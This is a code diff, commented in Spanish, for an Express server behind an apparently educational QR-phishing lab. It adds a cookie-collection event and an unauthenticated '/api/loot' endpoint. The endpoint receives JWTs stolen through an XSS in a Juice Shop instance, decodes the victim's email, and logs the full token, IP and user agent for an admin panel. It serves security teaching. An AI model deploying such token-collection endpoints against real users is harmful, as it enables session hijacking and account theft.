@@ -1,12 +1,28 @@
 require('dotenv').config();
 const express = require('express');
 const crypto = require('crypto');
+const os = require('os');
 const path = require('path');
 
 const PORT = parseInt(process.env.PORT || '3000', 10);
 const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
 const ENABLE_FAKE_LOGIN = process.env.ENABLE_FAKE_LOGIN !== 'false';
 const PUBLIC_URL = process.env.PUBLIC_URL || '';
+// IP de la red local para las URLs del arsenal QR y el endpoint-trampa.
+// En VMs con varias interfaces se puede fijar con LAN_IP en .env.
+function detectLanIp() {
+  for (const addrs of Object.values(os.networkInterfaces())) {
+    for (const a of addrs || []) {
+      if ((a.family !== 'IPv4' && a.family !== 4) || a.internal) continue;
+      // Dentro de Docker la única IPv4 suele ser la del propio contenedor
+      // (rango 172.16/12): mejor no adivinar que poner una IP inútil en los QR.
+      if (/^172\.(1[6-9]|2\d|3[01])\./.test(a.address)) continue;
+      return a.address;
+    }
+  }
+  return '';
+}
+const LAN_IP = process.env.LAN_IP || detectLanIp();
 
 if (!ADMIN_TOKEN) {
   throw new Error('ADMIN_TOKEN es obligatorio. Copia .env.example a .env y define un token largo y aleatorio.');
@@ -32,6 +48,7 @@ const events = [];
 const adminClients = new Set();
 const publicClients = new Set();
 const pendingPublicCommands = new Map();
+const loots = []; // botín recibido por el endpoint-trampa /api/loot
 const COMMAND_TTL_MS = 5 * 60 * 1000;
 
 // Etiquetas legibles y estables para cualquier cantidad de participantes:
@@ -48,7 +65,7 @@ function sessionLabel(index) {
 }
 
 const ALLOWED = new Set([
-  'landing_viewed', 'fake_login_submitted', 'keystroke',
+  'landing_viewed', 'fake_login_submitted', 'keystroke', 'cookies_collected',
   'camera_request_clicked', 'camera_permission_granted',
   'camera_permission_denied', 'camera_preview_active', 'camera_stopped',
   'screen_share_started', 'screen_share_denied', 'screen_share_stopped',
@@ -168,6 +185,15 @@ app.post('/api/events', rateLimit, (req, res) => {
     clean.field = String(payload.field || '').slice(0, 20);
     clean.len = Math.min(200, payload.len | 0);
   }
+  if (type === 'cookies_collected') {
+    // Solo cookies visibles para JavaScript. Los valores se almacenan ya
+    // enmascarados por el cliente: nunca guardamos el valor real.
+    clean.cookies = (Array.isArray(payload.cookies) ? payload.cookies : []).slice(0, 30).map(c => ({
+      name: String(c.name || '').slice(0, 60),
+      value: String(c.value || '').slice(0, 40)
+    }));
+    s.data.cookies = clean.cookies;
+  }
   if (type === 'camera_permission_granted') { s.data.cam = 'concedido'; s.stage = 'camara'; }
   if (type === 'camera_permission_denied') { s.data.cam = 'rechazado'; }
   if (type === 'camera_preview_active') { s.data.cam = 'vista previa activa'; }
@@ -178,6 +204,36 @@ app.post('/api/events', rateLimit, (req, res) => {
   if (type === 'reveal_seen') { s.stage = 'revelado'; }
   pushEvent({ id: crypto.randomUUID(), session_id, type, created_at: Date.now(), label: s.label, payload: clean });
   res.json({ ok: true });
+});
+
+// Botín del arsenal QR: el XSS en Juice Shop envía el JWT aquí. Es un
+// endpoint-trampa a propósito SIN auth (la víctima no tiene sesión con esta
+// app). Igual de efímero que todo lo demás: memoria, rate limit y tope.
+function jwtEmail(token) {
+  try {
+    const parts = String(token).split('.');
+    if (parts.length !== 3) return null;
+    const b64 = parts[1].replace(/-/g, '+').replace(/_/g, '/');
+    const payload = JSON.parse(Buffer.from(b64, 'base64').toString('utf8'));
+    const email = payload && payload.data && payload.data.email;
+    return typeof email === 'string' ? email.slice(0, 120) : null;
+  } catch (_) { return null; }
+}
+
+app.get('/api/loot', rateLimit, (req, res) => {
+  const loot = String(req.query.loot || '').slice(0, 2000);
+  const stolen = loot !== '' && loot !== 'none';
+  const entry = {
+    id: crypto.randomUUID(), ts: Date.now(), ip: req.ip,
+    ua: String(req.headers['user-agent'] || '').slice(0, 120),
+    stolen, email: null, token: loot
+  };
+  if (stolen) entry.email = jwtEmail(loot);
+  loots.push(entry);
+  if (loots.length > 200) loots.shift();
+  pushEvent({ id: crypto.randomUUID(), type: 'loot_received', created_at: Date.now(), payload: { stolen, email: entry.email } });
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.status(204).end();
 });
 
 // Espejo en vivo de la pestaña: la landing reporta qué ve/escribe la persona.
@@ -229,7 +285,7 @@ app.get('/api/session/command', (req, res) => {
 });
 
 app.get('/api/config', (req, res) => {
-  res.json({ publicUrl: PUBLIC_URL, fakeLogin: ENABLE_FAKE_LOGIN });
+  res.json({ publicUrl: PUBLIC_URL, fakeLogin: ENABLE_FAKE_LOGIN, lanIp: LAN_IP });
 });
 
 // ---------- SSE ----------
@@ -269,7 +325,9 @@ app.get('/api/admin/stats', auth, (req, res) => {
     camSolicitudes: all.filter(s => s.data.cam !== 'sin solicitar').length,
     camAceptadas: all.filter(s => ['concedido', 'vista previa activa'].includes(s.data.cam)).length,
     camRechazadas: all.filter(s => s.data.cam === 'rechazado').length,
-    pantallas: all.filter(s => s.data.share === 'compartiendo').length
+    pantallas: all.filter(s => s.data.share === 'compartiendo').length,
+    lootEjec: loots.length,
+    lootRobos: loots.filter(l => l.stolen).length
   };
   res.json({
     sessions: all.map(s => ({
@@ -277,7 +335,8 @@ app.get('/api/admin/stats', auth, (req, res) => {
       last_seen: s.last_seen, data: s.data
     })),
     events: events.slice(-60).reverse(),
-    counters: c
+    counters: c,
+    loots: loots.slice(-50).reverse()
   });
 });
 
@@ -291,6 +350,7 @@ app.post('/api/admin/reset', auth, (req, res) => {
   issuePublicCommand('reset');
   sessions.clear();
   events.length = 0;
+  loots.length = 0;
   res.json({ ok: true });
 });
 
@@ -304,6 +364,7 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log('  QUISHING LAB — demo educativa (efímera)');
   console.log('  Landing:   http://localhost:' + PORT + '/');
   console.log('  Panel:     http://localhost:' + PORT + '/admin');
+  console.log('  LAN:       http://' + (LAN_IP || 'IP-LAN') + ':4000 (Juice Shop — cebo del arsenal)');
   console.log('  Token:     definido en .env');
   console.log('  Túnel:     cloudflared tunnel --url http://localhost:' + PORT);
   console.log('============================================');
